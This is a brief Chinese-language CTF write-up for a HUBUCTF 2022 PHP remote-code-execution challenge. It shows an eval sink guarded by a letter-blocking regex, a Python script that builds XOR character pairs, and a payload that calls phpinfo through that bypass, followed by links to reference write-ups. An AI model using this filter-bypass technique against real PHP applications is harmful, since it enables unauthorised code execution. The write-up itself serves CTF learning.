#RCE 
```php
<?php
show_source(__FILE__);
$mess = $_POST['mess'];
if (preg_match("/[a-zA-Z]/", $mess)) {
    die("invalid input!");
}
eval($mess);
```

这个题取反不知为何我这里没反应

#### 异或
```php
valid = "1234567890!@$%^*(){}[];\'\",.<>/?-=_`~ "
 
answer = "phpinfo"
 
tmp1,tmp2 = '',''
for c in answer:
    for i in valid:
        for j in valid:
            if (ord(i)^ord(j) == ord(c)):
                tmp1 += i
                tmp2 += j
                break
        else:
            continue
        break
print(tmp1,tmp2)
// mess=$_="0302181"^"@[@[_^^";$_();
```
参考

[[HUBUCTF 2022 新生赛]_S@Kura的博客-CSDN博客](https://blog.csdn.net/zhhhb1005/article/details/127035837)

[[HUBUCTF 2022 新生赛]HowToGetShell题解_dockerere的博客-CSDN博客](https://blog.csdn.net/qq_64222098/article/details/132162902)
